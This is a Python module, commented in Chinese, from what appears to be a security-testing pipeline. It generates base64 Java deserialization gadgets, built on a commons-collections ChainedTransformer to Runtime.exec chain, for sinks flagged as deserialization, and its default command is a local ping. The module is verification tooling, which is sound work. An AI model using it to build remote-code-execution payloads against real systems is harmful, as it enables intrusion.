"""Sink 模式 gadget 构造器（方案 1a）。

设计原则（C5 决议，高危）：按「sink 调用模式」合成真实 Java 序列化 gadget，
**绝不按函数名枚举**。每个构造器对应一种稳定的 sink 模式，而非某个 gadget 名字。

当前实现的 sink 模式：ctf-java-quote 模式
------------------------------------------------
应用把反序列化得到的 Map 放进 userConfig，随后 CacheProcessor.process(userConfig)
取出 key="transformer" 的值强转为 commons-collections Transformer，并逐条 cache 值调用
transformer.transform(...)。故 gadget 根 = HashMap{"transformer": ChainedTransformer(Runtime.exec 链)}。

这与 ysoserial 的任何标准 gadget 图都无关——是「应用对反序列化对象的某字段调用
Transformer.transform()」这一模式的直接映射。新自定义链只要命中同一模式，构造器即可复用。

自检（用户硬性要求，第 3 点）：产出的 base64 必须经 payload_forge.selfcheck（解码后以
AC ED 00 05 开头），否则直接抛 GadgetBuildError，绝不把废弹登记为 attack_payload。
"""
from __future__ import annotations

import base64
import json
import os
import logging
import shutil
import subprocess
from typing import List, Optional
from src.core import workspace_runtime

logger = logging.getLogger(__name__)

# tools/gadget_builder 目录（GadgetBuilder.java + 已编译的 .class + lib/commons-collections-3.1.jar）
_BUILDER_DIR = os.path.abspath(
    os.path.join(os.path.dirname(__file__), "..", "..", "tools", "gadget_builder")
)
_CC_JAR = os.path.join(_BUILDER_DIR, "lib", "commons-collections-3.1.jar")
_BUILDER_CLASS = "GadgetBuilder"

# sink 模式识别特征：deserialization 族下，attack_payloads / poc_chain 文本出现这些即视为命中
# 「字段驱动 Transformer.transform」模式。commonscollections 是 A2 自身对链风格的标注信号，
# transformer.transform / applyTransformer 是未来若 poc_chain 直接写出 sink 签名时的前瞻匹配。
_TRANSFORMER_FIELD_SIGNATURES = (
    "commonscollections",
    "transformer.transform",
    "applytransformer",
)

# SCA 组件名里出现这些子串即视为「classpath 上存在已知的 commons-collections 式 gadget 库」。
# 用于方案 1a 的 SCA 兜底触发：即便 A2 的 poc_chain 没标注 transformer 签名（标注不稳定），
# 只要 SCA 确认 commons-collections 在依赖树上，反序列化 sink 就仍可强制造 CommonsCollections
# 式 Transformer gadget（ctf-java-quote 模式）。这些库正是 Transformer 式 gadget 的来源，
# 与 JNDI(@type JdbcRowSetImpl) 等无关，故不会误触发非 transformer 链。
_GADGET_LIB_SIGNATURES = (
    "commons-collections",
    "commons-collections4",
    "org.apache.commons.collections",
)

# 默认命令：仅用于产生可观测副作用的验证性 gadget，不做破坏性操作。
# 靶机 OS 不同命令不同；生产环境应覆盖。可用环境变量 GADGET_BUILDER_COMMAND 覆盖。
_DEFAULT_COMMAND = os.environ.get("GADGET_BUILDER_COMMAND") or "ping -n 2 127.0.0.1"


class GadgetBuildError(RuntimeError):
    """构造器产物非法（如未通过自检）时抛出——调用方应显式处理，不要静默降级。"""


def _candidate_javas() -> List[str]:
    """按优先级列出候选 java 可执行文件路径，避免只依赖 PATH（后端子进程由 launch_stack
    拉起时 PATH 未必带 java，但会注入 YSO_JAVA_HOME=JDK8）。

    优先级：
      1. 显式环境变量：JAVA_HOME / YSO_JAVA_HOME / JDK8_HOME / JAVA8_HOME（指向 JDK 根，补 bin/java）；
      2. 已知固定 JDK 根（与 launch_stack.py 的 JAVA/JDK8_HOME 约定一致）；
      3. 常见 Windows 安装位置；
      4. 最后回退 PATH 搜索。
    """
    sep = ";" if os.name == "nt" else ":"
    cands: List[str] = []
    # 1. 环境变量（指向 JDK 根目录，或已指向 bin/java）
    for var in ("JAVA_HOME", "YSO_JAVA_HOME", "JDK8_HOME", "JAVA8_HOME", "GADGET_JDK_HOME"):
        v = os.environ.get(var)
        if not v:
            continue
        cands.append(os.path.join(v, "bin", "java.exe") if os.name == "nt" else os.path.join(v, "bin", "java"))
        cands.append(os.path.join(v, "java.exe") if os.name == "nt" else os.path.join(v, "java"))
    # 2. 已知固定 JDK 根（来自 workspace 配置 / GADGET_JDK_HOME，避免硬编码本机路径）
    gadget_jdk_home = os.environ.get("GADGET_JDK_HOME")
    if gadget_jdk_home and gadget_jdk_home not in cands:
        cands.append(os.path.join(gadget_jdk_home, "bin", "java.exe") if os.name == "nt" else os.path.join(gadget_jdk_home, "bin", "java"))
    for root in list(workspace_runtime.jdk_candidates()):
        cands.append(os.path.join(root, "bin", "java.exe") if os.name == "nt" else os.path.join(root, "bin", "java"))
    # 3. 常见 Windows 安装位置
    if os.name == "nt":
        for base in ("C:\\Program Files\\Java", "C:\\Program Files (x86)\\Java", "D:\\Program Files\\Java"):
            try:
                for name in os.listdir(base):
                    cands.append(os.path.join(base, name, "bin", "java.exe"))
            except Exception:
                pass
    # 4. PATH 回退
    p = shutil.which("java")
    if p:
        cands.append(p)
    return [c for c in cands if c]


def _resolve_java() -> str:
    for c in _candidate_javas():
        if os.path.isfile(c) and os.access(c, os.X_OK):
            return c
    searched = "\n  ".join(_candidate_javas()) or "(无候选)"
    raise GadgetBuildError(
        "未找到 java 可执行文件，无法构建 gadget（需要 JRE 运行 GadgetBuilder）。已搜索：\n  " + searched
    )


def _resolve_javac(java: str) -> Optional[str]:
    """定位与 java 同源的 javac。

    必须按平台补扩展名：旧实现写死 ``os.path.join(dirname(java), "javac")``，在 Windows 上
    拼出 ``...\\bin\\javac``（无 .exe）永远不存在，于是按需编译**从未成功过**——这正是
    GadgetBuilder.class 长期只能靠外部手工编译、最终留下 class file 68（Java 24）不兼容产物的
    根源之一（2026-09-13 事故）。
    """
    d = os.path.dirname(java)
    names = ("javac.exe", "javac") if os.name == "nt" else ("javac",)
    for n in names:
        p = os.path.join(d, n) if d else n
        if os.path.isfile(p):
            return p
    # java 来自 PATH 搜索（无目录部分）→ 同样按 PATH 找 javac
    found = shutil.which("javac")
    if found:
        return found
    return None


def _compile_builder() -> None:
    java = _resolve_java()
    javac = _resolve_javac(java)
    if not javac:
        raise GadgetBuildError(
            "未找到 javac，无法按需编译 GadgetBuilder.java"
            f"（需要 JDK 而非 JRE；已按 java 路径查找：{java}）"
        )
    src = os.path.join(_BUILDER_DIR, "GadgetBuilder.java")
    sep = ";" if os.name == "nt" else ":"
    try:
        subprocess.run(
            # -encoding UTF-8 必需：GadgetBuilder.java 含中文注释，JDK8 javac 默认按平台编码
            # （Windows 简体中文为 GBK）读取，会报「编码GBK的不可映射字符」编译失败。
            # 该失败曾被绕过——改用高版本 JDK 编译，结果产出 class file 68（Java 24）的
            # 不兼容 class，在 JDK8 上运行即 UnsupportedClassVersionError（2026-09-13 事故）。
            [javac, "-encoding", "UTF-8", "-cp", f"{_CC_JAR}{sep}{_BUILDER_DIR}",
             "-d", _BUILDER_DIR, src],
            check=True, capture_output=True, text=True, timeout=120,
        )
    except Exception as exc:  # noqa: BLE001
        raise GadgetBuildError(f"GadgetBuilder 编译失败：{exc}")


def _exec_builder(cmd: List[str]) -> "subprocess.CompletedProcess":
    try:
        return subprocess.run(cmd, capture_output=True, text=True, timeout=120)
    except Exception as exc:  # noqa: BLE001
        raise GadgetBuildError(f"gadget 构建进程异常：{exc}")


def _run_builder(command: str) -> str:
    java = _resolve_java()
    classfile = os.path.join(_BUILDER_DIR, "GadgetBuilder.class")
    if not os.path.exists(classfile):
        _compile_builder()
    sep = ";" if os.name == "nt" else ":"
    cmd = [
        java, "-cp", f"{_CC_JAR}{sep}{_BUILDER_DIR}",
        _BUILDER_CLASS, command,
    ]

    proc = _exec_builder(cmd)

    # class 文件版本与运行 JDK 不兼容 → 强制重编一次再试。
    # 事故（2026-09-13）：tools/gadget_builder/GadgetBuilder.class 是历史遗留的 Java 24
    # （class file 68）产物，而运行 JDK 是 8（major 52）。因 _compile_builder 只在 class
    # 缺失时才触发，该不兼容 class 被永久复用，每次 D1 重放都抛 UnsupportedClassVersionError
    # 并被静默降级到 ysoserial/弹药库，导致 gadget 构造长期全灭、大量 spec 无证据。
    if proc.returncode != 0 and "UnsupportedClassVersionError" in (proc.stderr or ""):
        logger.warning(
            "[gadget_builder] GadgetBuilder.class 与运行 JDK 版本不兼容，强制重编后重试"
        )
        _compile_builder()
        proc = _exec_builder(cmd)

    if proc.returncode != 0 or not proc.stdout.strip():
        raise GadgetBuildError(
            f"gadget 构建失败 rc={proc.returncode}: {proc.stderr.strip()[:500]}"
        )
    return proc.stdout.strip()


def selfcheck_payload(b64: str) -> bool:
    """复用 payload_forge.selfcheck 语义：base64 解码须以 Java 序列化魔数 AC ED 00 05 开头。"""
    try:
        from src.iast.payload_forge import PayloadForge
        return bool(PayloadForge.selfcheck(b64, "ysoserial"))
    except Exception:  # noqa: BLE001
        try:
            raw = base64.b64decode(b64, validate=True)
        except Exception:
            return False
        return raw.startswith(b"\xac\xed\x00\x05") and len(raw) > 8


def _sink_is_transformer_field(spec: Optional[dict]) -> bool:
    """识别 ctf-java-quote 式「字段驱动 Transformer.transform」sink 模式。

    判据（有界、不与函数名枚举混淆）：
      - family == deserialization（非此族一律不触发，排除 info-disclosure/xss 等误命中）；
      - 且 A2 标注/链中指示这是 commons-collections Transformer 类 gadget——
        即 attack_payloads / poc_chain 文本出现 commonscollections / transformer.transform / applyTransformer。
    其中 commonscollections 是 A2 自身对该链的判断信号（它把链标注成 CC 风格），
    构造器据此产出与之匹配的真字节；JNDI(@type JdbcRowSetImpl)、空 payload 等不会被误触发。
    """
    spec = spec or {}
    fam = str(spec.get("family") or spec.get("category") or "").strip().lower()
    if fam != "deserialization":
        return False

    hay: List[str] = []

    ap = spec.get("attack_payloads")
    if isinstance(ap, list):
        hay.append(" ".join(str(x) for x in ap))
    apj = spec.get("attack_payloads_json")
    if isinstance(apj, str):
        hay.append(apj)

    pc = spec.get("poc_chain")
    if not isinstance(pc, list):
        raw = spec.get("poc_chain_json")
        if isinstance(raw, str) and raw:
            try:
                pc = json.loads(raw)
            except Exception:
                pc = None
    if isinstance(pc, list):
        for n in pc:
            if isinstance(n, dict):
                hay.append(str(n.get("node", "")))
                hay.append(str(n.get("signature", "")))
                hay.append(str(n.get("role", "")))

    text = " ".join(hay).lower()
    return any(sig.lower() in text for sig in _TRANSFORMER_FIELD_SIGNATURES)


def sca_confirms_gadget_library(components: Optional[list]) -> bool:
    """SCA 组件清单里是否存在已知 gadget 库（commons-collections 等）。

    用于方案 1a 的 SCA 兜底触发：A2 的 poc_chain 文本标注不稳定（有时写 CommonsCollections6
    gadget chain、有时只写 readObject），但只要 SCA 确认 classpath 上有 commons-collections，
    反序列化 sink 就可强制造 Transformer gadget，不必依赖 A2 标注。
    """
    if not components:
        return False
    names = " ".join(str(c.get("name", "")) if isinstance(c, dict) else str(c) for c in components).lower()
    return any(sig.lower() in names for sig in _GADGET_LIB_SIGNATURES)


def build_for_sink_pattern(spec: Optional[dict], command: str = "", force: bool = False) -> Optional[str]:
    """若 spec 的 sink 模式匹配已知构造器，返回 base64 真 payload；否则返回 None（交由调用方走别的路径）。

    产出的 payload 强制过 selfcheck；不过即抛 GadgetBuildError（报错而非降级），
    杜绝把废弹登记为 attack_payload。

    force=True 时跳过 _sink_is_transformer_field 文本门控（由调用方在已确认 SCA 存在 gadget 库时
    显式开启），直接按 ctf-java-quote 模式造 CommonsCollections Transformer gadget。
    """
    if not force and not _sink_is_transformer_field(spec):
        return None
    cmd = command or _DEFAULT_COMMAND
    b64 = _run_builder(cmd)
    if not selfcheck_payload(b64):
        raise GadgetBuildError(
            "gadget 构建产物未通过自检（不是合法的 Java 序列化流 AC ED 00 05），拒绝登记"
        )
    return b64
